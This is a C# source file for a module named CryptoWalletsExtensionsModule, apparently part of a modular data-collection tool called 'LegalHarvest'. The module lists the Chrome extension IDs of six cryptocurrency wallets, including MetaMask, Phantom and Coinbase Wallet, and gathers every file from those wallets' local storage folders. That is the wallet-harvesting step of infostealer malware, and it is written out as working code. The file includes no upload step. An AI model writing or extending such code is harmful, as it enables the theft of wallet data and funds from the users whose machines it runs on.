using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class CryptoWalletsExtensionsModule : ICollectorModule
    {
        public string ModuleName => "CryptoWalletsExtensions";
        public bool CanExecute() => true;

        private readonly Dictionary<string, string> knownExtensions = new Dictionary<string, string>
        {
            { "nkbihfbeogaeaoehlefnkodbefgpgknn", "MetaMask" },
            { "bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom" },
            { "ibnejdfjmmkpcnlpebklmnkoeoihofec", "TronLink" },
            { "fhbohimaelbohpjbbldcngcnapndodjp", "Binance Chain Wallet" },
            { "aiifbnbfobpmeekipheeijimdpnlpgpp", "Coinbase Wallet" },
            { "hnfanknocfeofbddgcijnmhnfnkdnaad", "Keplr" }
        };

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string chromeExtensionsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\Local Extension Settings");
            if (!Directory.Exists(chromeExtensionsPath)) return items;

            foreach (var ext in knownExtensions)
            {
                string extPath = Path.Combine(chromeExtensionsPath, ext.Key);
                if (Directory.Exists(extPath))
                    foreach (string file in Directory.GetFiles(extPath, "*", SearchOption.AllDirectories))
                        items.Add(new CollectedItem { Category = $"CryptoExt-{ext.Value}", Name = file, Value = file, Timestamp = DateTime.Now });
            }
            return items;
        }
    }
}
